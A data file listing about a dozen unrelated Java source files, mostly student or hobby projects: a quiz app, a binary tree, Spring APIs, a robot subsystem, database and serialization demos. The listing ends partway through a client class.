    "/*****************************************************************************\n *                                                                           *\n *  This file is part of the BeanShell Java Scripting distribution.          *\n *  Documentation and updates may be found at http://www.beanshell.org/      *\n *                                                                           *\n *  Sun Public License Notice:                                               *\n *                                                                           *\n *  The contents of this file are subject to the Sun Public License Version  *\n *  1.0 (the \"License\"); you may not use this file except in compliance with *\n *  the License. A copy of the License is available at http://www.sun.com    * \n *                                                                           *\n *  The Original Code is BeanShell. The Initial Developer of the Original    *\n *  Code is Pat Niemeyer. Portions created by Pat Niemeyer are Copyright     *\n *  (C) 2000.  All Rights Reserved.                                          *\n *                                                                           *\n *  GNU Public License Notice:                                               *\n *                                                                           *\n *  Alternatively, the contents of this file may be used under the terms of  *\n *  the GNU Lesser General Public License (the \"LGPL\"), in which case the    *\n *  provisions of LGPL are applicable instead of those above. If you wish to *\n *  allow use of your version of this file only under the  terms of the LGPL *\n *  and not to allow others to use your version of this file under the SPL,  *\n *  indicate your decision by deleting the provisions above and replace      *\n *  them with the notice and other provisions required by the LGPL.  If you  *\n *  do not delete the provisions above, a recipient may use your version of  *\n *  this file under either the SPL or the LGPL.                              *\n *                                                                           *\n *  Patrick Niemeyer (pat@pat.net)                                           *\n *  Author of Learning Java, O'Reilly & Associates                           *\n *  http://www.pat.net/~pat/                                                 *\n *                                                                           *\n *****************************************************************************/\n\n\npackage org.gjt.sp.jedit.bsh;\n\nclass BSHThrowStatement extends SimpleNode\n{\n\tBSHThrowStatement(int id) { super(id); }\n\n\tpublic Object eval( CallStack callstack, Interpreter interpreter)  \n\t\tthrows EvalError\n\t{\n\t\tObject obj = ((SimpleNode)jjtGetChild(0)).eval(callstack, interpreter);\n\n\t\t// need to loosen this to any throwable... do we need to handle\n\t\t// that in interpreter somewhere?  check first...\n\t\tif(!(obj instanceof Exception))\n\t\t\tthrow new EvalError(\"Expression in 'throw' must be Exception type\",\n\t\t\t\tthis, callstack );\n\n\t\t// wrap the exception in a TargetException to propogate it up\n\t\tthrow new TargetError( (Exception)obj, this, callstack );\n\t}\n}\n\n",
    "package com.example.quizapp;\n\nimport android.app.AlertDialog;\nimport androidx.appcompat.app.AppCompatActivity;\nimport android.graphics.Color;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity implements View.OnClickListener{\n    TextView questionTextView;\n    TextView totalQuestionTextView;\n    Button ansA,ansB,ansC,ansD;\n    Button btn_submit;\n\n    int score=0;\n    int totalQuestion = QuestionAnswer.question.length;\n    int currentQuestionIndex =0;\n    String selectedAnswer=\"\";\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState){\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        totalQuestionTextView = findViewById(R.id.total_question);\n        questionTextView = findViewById(R.id.question);\n        ansA = findViewById(R.id.ans_a);\n        ansB = findViewById(R.id.ans_b);\n        ansC= findViewById(R.id.ans_c);\n        ansD = findViewById(R.id.ans_d);\n        btn_submit = findViewById(R.id.btn_submit);\n\n        ansA.setOnClickListener(this);\n        ansB.setOnClickListener(this);\n        ansC.setOnClickListener(this);\n        ansD.setOnClickListener(this);\n        btn_submit.setOnClickListener(this);\n\n\n        totalQuestionTextView.setText(\"Total question: \"+totalQuestion);\n\n        loadNewQuestion();\n    }\n\n    private void loadNewQuestion(){\n        if(currentQuestionIndex == totalQuestion){\n            finishQuiz();\n            return;\n        }\n        questionTextView.setText(QuestionAnswer.question[currentQuestionIndex]);\n        ansA.setText(QuestionAnswer.choices[currentQuestionIndex][0]);\n        ansB.setText(QuestionAnswer.choices[currentQuestionIndex][1]);\n        ansC.setText(QuestionAnswer.choices[currentQuestionIndex][2]);\n        ansD.setText(QuestionAnswer.choices[currentQuestionIndex][3]);\n\n        selectedAnswer=\"\";\n\n    }\n\n    private void finishQuiz(){\n        String passStatus;\n        if(score >= totalQuestion*0.6){\n            passStatus = \"Passed\";\n        }else{\n            passStatus = \"Failed\";\n        }\n        new AlertDialog.Builder(this)\n                .setTitle(passStatus)\n                .setMessage(\"Your Score is \"+score+\" Out of \"+totalQuestion)\n                .setPositiveButton(\"Restart\",((dialog, i) -> restartQuiz() ))\n                .setCancelable(false)\n                .show();\n    }\n\n    private void restartQuiz(){\n        score = 0;\n        currentQuestionIndex=0;\n        loadNewQuestion();\n    }\n\n    @Override\n    public void onClick(View view){\n        ansA.setBackgroundColor(Color.WHITE);\n        ansB.setBackgroundColor(Color.WHITE);\n        ansC.setBackgroundColor(Color.WHITE);\n        ansD.setBackgroundColor(Color.WHITE);\n\n        Button clickedButton = (Button) view;\n\n        if(clickedButton.getId() == R.id.btn_submit) {\n            if(!selectedAnswer.isEmpty()){\n                if(selectedAnswer.equals(QuestionAnswer.correctAnswers[currentQuestionIndex])){\n                    score++;\n                }else{\n                    clickedButton.setBackgroundColor(Color.MAGENTA);\n                }\n                currentQuestionIndex++;\n                loadNewQuestion();\n            }else{\n\n            }\n        }\n        else{\n            selectedAnswer=clickedButton.getText().toString();\n            clickedButton.setBackgroundColor(Color.YELLOW);\n        }\n    }\n}",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage com.mycompany.hw_1_12;\r\nimport com.mirea.kt.example.Message;\r\nimport java.io.FileInputStream;\r\nimport java.io.ObjectInputStream;\r\n/**\r\n *\r\n * @author Jginyue B760M\r\n */\r\npublic class MessageDeserializer implements Runnable {\r\n    private String filePath;\r\n\r\n    public MessageDeserializer(String filePath) {\r\n        this.filePath = filePath;\r\n    }\r\n\r\n    @Override\r\n    public void run() {\r\n        try (FileInputStream fileIn = new FileInputStream(filePath);\r\n             ObjectInputStream objectIn = new ObjectInputStream(fileIn)) {\r\n            Message message = (Message) objectIn.readObject();\r\n            System.out.println(\"ID: \" + message.getId());\r\n            System.out.println(\"Body: \" + message.getBody());\r\n            System.out.println(\"Type: \" + message.getType());\r\n            System.out.println(\"Has Attachments: \" + message.isHasAttachments());\r\n            System.out.println(\"Timestamp: \" + message.getTimestamp());\r\n        } catch (Exception e) {\r\n            System.out.println(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0434\u0435\u0441\u0435\u0440\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438: \" + e.getMessage());\r\n        }\r\n    }\r\n}\r\n",
    "package com.nt.largeobjs;\r\n\r\nimport java.io.FileOutputStream;\r\nimport java.io.InputStream;\r\nimport java.io.OutputStream;\r\nimport java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.ResultSet;\r\nimport java.sql.SQLException;\r\nimport java.util.Scanner;\r\n\r\n\r\n\r\nimport oracle.jdbc.oracore.Util;\r\n\r\npublic class Retriving_LargeObjects {\r\n\tprivate static final String RETRIVING_LARGE_OBJECT=\"SELECT AID,NAME,ADDRS,PHOTO FROM ARTIST_INFO WHERE AID=?\";\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t//read inputs\r\n\t   try(Scanner sc=new Scanner(System.in)){\r\n\t\t  \r\n\t\t\t   int aid=0;\r\n\t\t\t   if(sc!=null) {\r\n\t\t   System.out.println(\"enetr the artistid::\");\r\n\t\t   aid=sc.nextInt();\r\n\t\t   }\r\n\t\t   //create Connection PreparedStatement objects\r\n\t\t   try(Connection con=DriverManager.getConnection(\"jdbc:oracle:thin:@localhost:1521:xe\",\"system\",\"7825\");\r\n\t\t\t\t   PreparedStatement ps=con.prepareStatement(RETRIVING_LARGE_OBJECT);\r\n\t\t\t\t      ){\r\n\t\t\t       //set intput params\r\n\t\t\t         if(ps!=null)\r\n\t\t\t          ps.setInt(1,aid);\r\n\t\t\t   //cexecute the query\r\n\t\t\t         try(ResultSet rs=ps.executeQuery()){\r\n\t\t\t        \t //PROCESS THE RESULT\r\n\t\t\t        \tif(rs!=null){\r\n\t\t\t        \t\tif(rs.next()) {\r\n\t\t\t        \t\t\taid=rs.getInt(1);\r\n\t\t\t        \t\t\tString name=rs.getString(2);\r\n\t\t\t        \t\t\tString addrs=rs.getString(3);\r\n\t\t\t        \t\t\tSystem.out.println(aid+\" \"+name+\" \"+addrs);\r\n\t\t\t        \t\t\ttry(InputStream is=rs.getBinaryStream(4);\r\n\t\t\t        \t\t\t\t\t//create OUTput stream pointing to destination file\r\n\t\t\t        \t\t\t\t\tOutputStream os=new FileOutputStream(\"retrive_image.JFIF\");\r\n\t\t\t        \t\t\t\t\t){\r\n\t\t\t        \t\t\t\t//CRETAE BLOB COL VALUE TO DESTINATION FILE\r\n\t\t\t        \t\t\t\r\n\t\t\t        \t\t\t\tSystem.out.println(\"Blob value is retrived and stored in the file\");\r\n\t\t\t        \t\t\t}//try\r\n\t\t\t        \t\t\t\r\n\t\t\t        \t\t}//if\r\n\t\t\t        \t\telse\r\n\t\t\t        \t\t\tSystem.out.println(\"Record not Found\");\r\n\t\t\t        \t}//if\r\n\t\t\t         }//try\r\n\t\t\t        \r\n\t\t   }//try3\r\n\t   }//try2\r\n\tcatch(SQLException se) {\r\n\t\tse.printStackTrace();\r\n\t}//catch\r\n\t   catch(Exception e) {\r\n\t\t   e.printStackTrace();\r\n\t   }//catch\r\n\t\t\r\n\t}//main\r\n\r\n}//class\r\n",
    "import java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Represents a room where an exam can be conducted.\n */\npublic class Room {\n    private int roomNumber;\n    private int numRows;\n    private int numColumns;\n    private List<Boolean> seatAvailability;\n\n    /**\n     * Constructs a Room object with the specified parameters.\n     *\n     * @param roomNumber  The room number.\n     * @param numRows     The number of rows in the room.\n     * @param numColumns  The number of columns in each row of the room.\n     */\n    public Room(int roomNumber, int numRows, int numColumns) {\n        this.roomNumber = roomNumber;\n        this.numRows = numRows;\n        this.numColumns = numColumns;\n        this.seatAvailability = new ArrayList<>();\n        initializeSeats(); // Initialize the seats in the room\n    }\n\n    /**\n     * Initializes the availability of seats in the room.\n     * Assumes all seats are initially available.\n     */\n    private void initializeSeats() {\n        int totalSeats = numRows * numColumns;\n        for (int i = 0; i < totalSeats; i++) {\n            seatAvailability.add(true);\n        }\n    }\n\n    /**\n     * Gets the room number.\n     *\n     * @return The room number.\n     */\n    public int getRoomNumber() {\n        return roomNumber;\n    }\n\n    /**\n     * Gets the number of rows in the room.\n     *\n     * @return The number of rows.\n     */\n    public int getNumRows() {\n        return numRows;\n    }\n\n    /**\n     * Gets the number of columns in each row of the room.\n     *\n     * @return The number of columns.\n     */\n    public int getNumColumns() {\n        return numColumns;\n    }\n\n    /**\n     * Checks if a seat at the specified row and column is available.\n     *\n     * @param row    The row of the seat.\n     * @param column The column of the seat.\n     * @return True if the seat is available, false otherwise.\n     */\n    public boolean isSeatAvailable(int row, int column) {\n        int index = calculateIndex(row, column);\n        return seatAvailability.get(index);\n    }\n\n    /**\n     * Occupies a seat at the specified row and column.\n     *\n     * @param row    The row of the seat.\n     * @param column The column of the seat.\n     */\n    public void occupySeat(int row, int column) {\n        int index = calculateIndex(row, column);\n        seatAvailability.set(index, false);\n    }\n\n    /**\n     * Releases a previously occupied seat at the specified row and column.\n     *\n     * @param row    The row of the seat.\n     * @param column The column of the seat.\n     */\n    public void releaseSeat(int row, int column) {\n        int index = calculateIndex(row, column);\n        seatAvailability.set(index, true);\n    }\n\n    /**\n     * Calculates the index of the seat in the seatAvailability list based on its row and column.\n     *\n     * @param row    The row of the seat.\n     * @param column The column of the seat.\n     * @return The index of the seat in the seatAvailability list.\n     */\n    private int calculateIndex(int row, int column) {\n        return (row - 1) * numColumns + (column - 1);\n    }\n\n    /**\n     * Returns a string representation of the room.\n     *\n     * @return A string representing the room.\n     */\n    @Override\n    public String toString() {\n        return \"Room \" + roomNumber + \" with \" + numRows + \" rows and \" + numColumns + \" columns\";\n    }\n}\n",
    "import java.io.*;\nimport java.util.*;\n\npublic class Main {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(\"input.csv\"));\n            String line;\n            List<List<Integer>> votes = new ArrayList<>();\n            while ((line = reader.readLine()) != null) {\n                String[] parts = line.split(\",\");\n                List<Integer> vote = new ArrayList<>();\n                for (String part : parts) {\n                    vote.add(Integer.parseInt(part));\n                }\n                votes.add(vote);\n            }\n            reader.close();\n\n            Map<Integer, Integer> scores = new HashMap<>();\n            for (List<Integer> vote : votes) {\n                for (int i = 0; i < vote.size(); i++) {\n                    scores.put(vote.get(i), scores.getOrDefault(vote.get(i), 0) + (vote.size() - i));\n                }\n            }\n\n            List<Map.Entry<Integer, Integer>> entries = new ArrayList<>(scores.entrySet());\n            entries.sort((e1, e2) -> e2.getValue().compareTo(e1.getValue()));\n\n            BufferedWriter writer = new BufferedWriter(new FileWriter(\"result.txt\"));\n            for (int i = 0; i < entries.size(); i++) {\n                if (i > 0) {\n                    writer.write(\",\");\n                }\n                int j = i;\n                while (j < entries.size() - 1 && entries.get(j).getValue().equals(entries.get(j + 1).getValue())) {\n                    j++;\n                }\n                if (j == i) {\n                    writer.write(String.valueOf(entries.get(i).getKey()));\n                } else {\n                    writer.write(\"[\");\n                    for (int k = i; k <= j; k++) {\n                        if (k > i) {\n                            writer.write(\",\");\n                        }\n                        writer.write(String.valueOf(entries.get(k).getKey()));\n                    }\n                    writer.write(\"]\");\n                    i = j;\n                }\n            }\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
    "package org.example.main;\n\nimport jakarta.persistence.EntityManager;\nimport jakarta.persistence.NoResultException;\nimport org.example.dao.AlunoDAO;\nimport org.example.modelo.Aluno;\nimport org.example.util.JPAUtil;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\nimport java.math.BigDecimal;\nimport java.util.List;\nimport java.util.Scanner;\n\n/*\nMAURICIO BRITO TEIXEIRA   SC3033988\nVINICIUS DA SILVA GON\u00c7ALVES OLIVEIRA   SC3033406\n */\n\n@SpringBootApplication\npublic class Main {\n    public static void main(String[] args) {\n        SpringApplication.run(Main.class,args);\n        EntityManager em = JPAUtil.getEntityManager();\n        AlunoDAO alunoDAO = new AlunoDAO(em);\n        Scanner scanner = new Scanner(System.in);\n        int opcao;\n\n        do {\n            System.out.println(\"Menu de Op\u00e7\u00f5es:\");\n            System.out.println(\"1. Cadastrar aluno\");\n            System.out.println(\"2. Excluir aluno\");\n            System.out.println(\"3. Alterar aluno\");\n            System.out.println(\"4. Buscar aluno pelo nome\");\n            System.out.println(\"5. Listar alunos (com status aprova\u00e7\u00e3o)\");\n            System.out.println(\"6. Fim\");\n            System.out.print(\"Escolha uma op\u00e7\u00e3o (1-6): \");\n            opcao = scanner.nextInt();\n            scanner.nextLine();\n\n            switch (opcao) {\n                case 1:\n                    System.out.println(\"Digite o nome do aluno: \");\n                    String nome = scanner.nextLine();\n                    System.out.println(\"Digite o RA do aluno: \");\n                    String RA = scanner.nextLine();\n                    System.out.println(\"Digite o E-mail do aluno: \");\n                    String email = scanner.nextLine();\n                    System.out.println(\"Digite a nota 1 do aluno: \");\n                    BigDecimal nota1 = scanner.nextBigDecimal();\n                    System.out.println(\"Digite a nota 2 do aluno: \");\n                    BigDecimal nota2 = scanner.nextBigDecimal();\n                    System.out.println(\"Digite a nota 3 do aluno: \");\n                    BigDecimal nota3 = scanner.nextBigDecimal();\n                    Aluno aluno = new Aluno(nome,RA,email,nota1,nota2,nota3);\n                    alunoDAO.cadastrar(aluno);\n                    break;\n                case 2:\n                    System.out.println(\"Digite o nome do aluno: \");\n                    String nomeDlt = scanner.nextLine();\n                    Aluno alunoRemove = alunoDAO.removerPorNome(nomeDlt);\n                    if (alunoRemove!=null){\n                        String out = \"O aluno \"+alunoRemove.getNome()+\" foi removido.\";\n                        System.out.println(out);\n                    }\n                    break;\n                case 3:\n                    System.out.println(\"Digite o nome do aluno a ser alterado: \");\n                    nome = scanner.nextLine();\n                    System.out.println(\"Digite o novo nome do aluno: \");\n                    String newNome = scanner.nextLine();\n                    System.out.println(\"Digite o novo RA do aluno: \");\n                    RA = scanner.nextLine();\n                    System.out.println(\"Digite o novo E-mail do aluno: \");\n                    email = scanner.nextLine();\n                    System.out.println(\"Digite a nova nota 1 do aluno: \");\n                    nota1 = scanner.nextBigDecimal();\n                    System.out.println(\"Digite a nova nota 2 do aluno: \");\n                    nota2 = scanner.nextBigDecimal();\n                    System.out.println(\"Digite a nova nota 3 do aluno: \");\n                    nota3 = scanner.nextBigDecimal();\n                    Aluno newAluno = new Aluno(newNome, RA, email, nota1, nota2, nota3);\n                    alunoDAO.alterarAluno(newAluno, nome);\n                    break;\n                case 4:\n                    System.out.println(\"Digite o nome do aluno: \");\n                    String nomeBusc = scanner.nextLine();\n                    List<Aluno> listaP = alunoDAO.buscarPorNome(nomeBusc);\n                    if(!listaP.isEmpty()){\n                        for (Aluno alunos : listaP) {\n                            System.out.println(alunos.toString());\n                        }\n                    }\n                    else {\n                        System.out.println(\"Nenhum aluno encontrado para o nome informado!\");\n                    }\n                    break;\n                case 5:\n                    List<Aluno> lista = alunoDAO.buscarTodos();\n                    for (Aluno alunos : lista) {\n                        System.out.println(alunos.toString());\n                    }\n                    break;\n                case 6:\n                    System.out.println(\"Encerrando o programa.\");\n                    break;\n                default:\n                    System.out.println(\"Op\u00e7\u00e3o inv\u00e1lida. Tente novamente.\");\n            }\n        } while (opcao != 6);\n        scanner.close();",
    "package uvg.ed.gt;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class BinaryTree<E> {\n    private class Node {\n        E data;\n        Node left;\n        Node right;\n\n        Node(E data) {\n            this.data = data;\n            left = null;\n            right = null;\n        }\n    }\n\n    private Node root;\n\n    public BinaryTree() {\n        root = null;\n    }\n\n    public void insert(E data) {\n        root = insertRec(root, data);\n    }\n\n    private Node insertRec(Node root, E data) {\n        if (root == null) {\n            root = new Node(data);\n            return root;\n        }\n\n        if (data.hashCode() < root.data.hashCode())\n            root.left = insertRec(root.left, data);\n        else if (data.hashCode() > root.data.hashCode())\n            root.right = insertRec(root.right, data);\n\n        return root;\n    }\n\n    public void inorder() {\n        inorderRec(root);\n    }\n\n    private void inorderRec(Node root) {\n        if (root != null) {\n            inorderRec(root.left);\n            System.out.print(root.data + \" \");\n            inorderRec(root.right);\n        }\n    }\n\n    public List<E> inOrderTraversal() {\n        List<E> result = new ArrayList<>();\n        inOrderTraversalRec(root, result);\n        return result;\n    }\n\n    private void inOrderTraversalRec(Node root, List<E> result) {\n        if (root != null) {\n            inOrderTraversalRec(root.left, result);\n            result.add(root.data);\n            inOrderTraversalRec(root.right, result);\n        }\n    }\n\n    public boolean search(E data) {\n        return searchRec(root, data);\n    }\n\n    private boolean searchRec(Node root, E data) {\n        if (root == null)\n            return false;\n        if (data.equals(root.data))\n            return true;\n\n        if (data.hashCode() < root.data.hashCode())\n            return searchRec(root.left, data);\n        else\n            return searchRec(root.right, data);\n    }\n}\n\n\n\n\n\n",
    "package com.shopease.api;\n\nimport java.util.List;\n\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.core.env.Environment;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PutMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport com.shopease.dto.ProductDTO;\nimport com.shopease.exception.Shopease;\nimport com.shopease.service.CustomerProductService;\n\n@RestController\n@RequestMapping(value = \"/product-api\")\npublic class ProductAPI {\n\t\n\t@Autowired\n\tprivate CustomerProductService customerProductService;\n\t\n\t@Autowired\n\tprivate Environment environment;\n\t\n\tLog logger = LogFactory.getLog(ProductAPI.class); \n\t\n\t@GetMapping(value = \"/products\")\n\tpublic ResponseEntity<List<ProductDTO>> getAllProducts() throws Shopease{\n\t\tlogger.info(\"Received a request to get product details for all products\");\n\t\tList<ProductDTO> list = customerProductService.getAllProducts();\n\t\treturn new ResponseEntity<>(list,HttpStatus.OK);\n\t}\n\n\t@GetMapping(value = \"/product/{productId}\")\n\tpublic ResponseEntity<ProductDTO> getProduct(@PathVariable Integer productId) throws Shopease {\n\t\tlogger.info(\"Received a request to get product details for product with productId as : \" + productId);\n\t\tProductDTO product = customerProductService.getProductById(productId);\n\t\treturn new ResponseEntity<>(product,HttpStatus.OK);\n\t}\n\t\n\t@PutMapping(value = \"/product/{productId}\")\n\tpublic ResponseEntity<String> reduceAvailableQuantity(@PathVariable Integer productId, @RequestBody ProductDTO quantity ) throws Exception {\n\t\tlogger.info(\"Received a reqeust to update the available quantity for product with productId as \" + productId);\n\t\tcustomerProductService.reduceAvailableQuantity(productId, quantity.getAvailableQuantity());\n\t\treturn new ResponseEntity<>(environment.getProperty(\"ProductAPI.REDUCE_QUANTITY_SUCCESSFULL\"),HttpStatus.OK);\n\t}\n}\n",
    "package frc.robot.subsystems;\n\nimport com.revrobotics.CANSparkMax;\n\nimport edu.wpi.first.wpilibj.smartdashboard.SmartDashboard;\nimport edu.wpi.first.wpilibj2.command.Command;\nimport edu.wpi.first.wpilibj2.command.InstantCommand;\nimport edu.wpi.first.wpilibj2.command.SequentialCommandGroup;\nimport edu.wpi.first.wpilibj2.command.SubsystemBase;\nimport edu.wpi.first.wpilibj2.command.WaitCommand;\nimport frc.robot.Constants.SpeedConstants;\nimport frc.robot.Constants.CANConstants;;\n\npublic class IntakeShoot extends SubsystemBase{\n    private CANSparkMax m_intake1;\n    private CANSparkMax m_intake2;\n    private CANSparkMax m_shooter1;\n    private CANSparkMax m_shooter2;\n    private CANSparkMax m_support1;\n    private CANSparkMax m_support2;\n    \n    private double m_intakeSpeed = SpeedConstants.IntakeSpeed;\n    private double m_humanIntakeSpeed = SpeedConstants.HumanIntakeSpeed;\n    private double m_ampShooterSpeed = SpeedConstants.AmpShooterSpeed;\n    private double m_speakerShooterSpeed = SpeedConstants.SpeakerShooterSpeed;\n\n    private double m_speakerOutakeDelay = SpeedConstants.SpeakerOutakeDelay;\n    private double m_speakerShooterDelay = SpeedConstants.SpeakerShooterDelay;\n\n    private double m_desiredIntakeSpeed = 0;\n    private double m_desiredShooterSpeed = 0;\n    private double m_desiredSupportSpeed = 0;\n\n    public IntakeShoot(){\n        m_intake1 = new CANSparkMax(CANConstants.INTAKE_MOTOR_1, CANSparkMax.MotorType.kBrushless);\n        m_intake2 = new CANSparkMax(CANConstants.INTAKE_MOTOR_2, CANSparkMax.MotorType.kBrushless);\n\n        m_shooter1 = new CANSparkMax(CANConstants.SHOOTER_MOTOR_1, CANSparkMax.MotorType.kBrushless);\n        m_shooter2 = new CANSparkMax(CANConstants.SHOOTER_MOTOR_2, CANSparkMax.MotorType.kBrushless);\n\n        m_support1 = new CANSparkMax(CANConstants.SUPPORT_MOTOR_1, CANSparkMax.MotorType.kBrushless);\n        m_support2 = new CANSparkMax(CANConstants.SUPPORT_MOTOR_2, CANSparkMax.MotorType.kBrushless);\n\n        m_intake2.follow(m_intake1, true);\n        m_shooter2.follow(m_shooter1, true);\n        m_support2.follow(m_support1, true);\n    }\n\n    @Override\n    public void periodic() {\n        m_intake1.set(m_desiredIntakeSpeed);\n        m_shooter1.set(m_desiredShooterSpeed);\n        m_support1.set(m_desiredSupportSpeed);\n\n        SmartDashboard.putNumber(\"Intake Speed\", m_desiredIntakeSpeed);\n        SmartDashboard.putNumber(\"Shooter Speed\", m_desiredShooterSpeed);\n        SmartDashboard.putNumber(\"Support Speed\", m_desiredSupportSpeed);\n        super.periodic();\n    }\n\n    public Command startIntake(){\n        return new InstantCommand(() -> {\n            m_desiredIntakeSpeed = m_intakeSpeed;\n            m_desiredSupportSpeed = m_intakeSpeed;\n        }, this);\n    }\n\n    public Command startOutake(){\n        return new InstantCommand(() -> {\n            m_desiredIntakeSpeed = -m_intakeSpeed;\n            m_desiredSupportSpeed = -m_intakeSpeed;\n        }, this);\n    }\n\n    public Command stopIntake(){\n        return new InstantCommand(() -> {\n            m_desiredIntakeSpeed = 0;\n            m_desiredSupportSpeed = 0;\n        }, this);\n    }\n\n    public Command startAmpShot(){\n        return new InstantCommand(() -> {\n            m_desiredShooterSpeed = m_ampShooterSpeed;\n            m_desiredSupportSpeed = m_ampShooterSpeed;\n        }, this);\n    }\n\n    public Command startSpeakerShot(){\n        return new InstantCommand(() -> {\n            m_desiredShooterSpeed = m_speakerShooterSpeed;\n            m_desiredSupportSpeed = m_speakerShooterSpeed;\n\n        }, this);\n    }\n\n    public Command startHumanIntake(){\n        return new InstantCommand(() -> {\n            m_desiredShooterSpeed = m_humanIntakeSpeed;\n            m_desiredSupportSpeed = m_humanIntakeSpeed;\n        }, this);\n    }\n\n    public Command stopShooter(){\n        return new InstantCommand(() -> {\n            m_desiredShooterSpeed = 0;\n            m_desiredSupportSpeed = 0;\n        }, this);\n    }\n\n    public Command stopAll(){\n        return new InstantCommand(() -> {\n            m_desiredIntakeSpeed = 0;\n            m_desiredShooterSpeed = 0;\n            m_desiredSupportSpeed = 0;\n        }, this);\n    }\n\n    public SequentialCommandGroup tempSpeakerOuttake(){\n        return new SequentialCommandGroup(\n            startOutake(),\n            new WaitCommand(m_speakerOutakeDelay),\n            stopIntake()\n        );\n    }\n\n    public SequentialCommandGroup tempSpeakerShooter(){\n        return new SequentialCommandGroup(\n            startSpeakerShot(),\n            new WaitCommand(m_speakerShooterDelay),\n            stopShooter()\n        );\n    }\n\n    public SequentialCommandGroup fullSpeakerShot(){\n        return new SequentialCommandGroup(\n            tempSpeakerOuttake(),\n            new WaitCommand(0.05),\n            tempSpeakerShooter()\n        );\n    }\n\n}\n\n",
    "public class Personnage extends EntiteMobile {\n    public static int sauve = 0;\n    \n    public Personnage(Direction direction) {\n        super(direction);\n        resistance = 3;\n    }\n\n    public String toString(String background) {\n        switch (direction) {\n            case nord:\n                return background.charAt(0) + \"^\" + background.charAt(2);\n            case sud:\n                return background.charAt(0) + \"v\" + background.charAt(2);\n            case est:\n                return background.charAt(0) + \">\" + background.charAt(2);\n            case ouest:\n                return background.charAt(0) + \"<\" + background.charAt(2);\n            default:\n                return background.charAt(0) + \"^\" + background.charAt(2);\n        }\n    }\n\n    public void action(Case courante, Case cible) {\n        if (courante instanceof Sortie) {\n            sauve++;\n            Sortie c = (Sortie)courante;\n            c.vide();\n        } else if (cible.estLibre()) {\n            CaseTraversable c = (CaseTraversable)cible;\n            CaseTraversable c2 = (CaseTraversable)courante;\n            c.entre(c2.getContenu());\n            c2.vide();\n        } else if (cible instanceof CaseTraversable) {\n            CaseTraversable c = (CaseTraversable)cible;\n            if (c.getContenu() instanceof Obstacle) {\n                Entite o = c.getContenu();\n                o.perdResistance();\n                if (o.resistance <= 0) {\n                    c.vide();\n                } else {\n                    c.vide();\n                    c.entre(o);\n                }\n            } else {\n                direction = Direction.random();\n            }\n        } else {\n            direction = Direction.random();\n        }\n    }\n}\n",
    "package crptapi;\n\nimport com.google.gson.Gson;\n\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\n\npublic class Main {\n    public static void main(String[] args) throws InterruptedException {\n        CrptApi api = new CrptApi(TimeUnit.SECONDS, 1, \"https://ismp.crpt.ru/api/v3/lk/documents/create\");\n\n        String json = \"\";\n        try (BufferedReader bg = new BufferedReader(new FileReader(\"src/main/resources/document.json\", StandardCharsets.UTF_8))) {\n            json = bg.lines()\n                    .map(String::trim).map(String::strip)\n                    .collect(Collectors.joining(\"\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.out.println(json);\n\n        Gson gson = new Gson();\n        Document document = gson.fromJson(json.trim(), Document.class);\n        System.out.println(document.toString());\n\n        String signature = \"signature\";\n        api.createDocument(document, signature);\n\n        api.shutdown();\n    }\n}",
    "package Cliente;\r\n\r\npublic class Clientes {\r\n    private String nombre;\r\n    private long cedula;\r\n    private double dineroAhorrado;\r\n    private double nivelIngresos;\r\n    private String fechaCreacion;\r\n\r\n    public Clientes(String nombre, long cedula,  double dineroAhorrado, double nivelIngresos, String fechaCreacion) {\r\n        this.nombre = nombre;\r\n        this.cedula = cedula;\r\n        this.dineroAhorrado = dineroAhorrado;\r\n        this.nivelIngresos = nivelIngresos;\r\n        this.fechaCreacion = fechaCreacion;\r\n    }\r\n\r\n    // Getters y Setters\r\n    public String getNombre() {\r\n        return nombre;\r\n    }\r\n\r\n    public void setNombre(String nombre) {\r\n        this.nombre = nombre;\r\n    }\r\n\r\n    public double getCedula() {\r\n        return cedula;\r\n    }\r\n\r\n    public void setCedula(long cedula) {\r\n        this.cedula = cedula;\r\n    }\r\n\r\n    public double getDineroAhorrado() {\r\n        return dineroAhorrado;\r\n    }\r\n\r\n    public void setDineroAhorrado(double dineroAhorrado) {\r\n        this.dineroAhorrado = dineroAhorrado;\r\n    }\r\n\r\n    public double getNivelIngresos() {\r\n        return nivelIngresos;\r\n    }\r\n\r\n    public void setNivelIngresos(double nivelIngresos) {\r\n        this.nivelIngresos = nivelIngresos;\r\n    }\r\n\r\n    public String getFechaCreacion() {\r\n        return fechaCreacion;\r\n    }\r\n\r\n    public void setFechaCreacion(String fechaCreacion) {\r\n        this.fechaCreacion = fechaCreacion;\r\n    }\r\n\r\n    public String toString() {\r\n        return \"Cliente:\" +\r\n                \" Nombre: '\" + nombre + '\\'' +\r\n                \", Cedula: \" + cedula  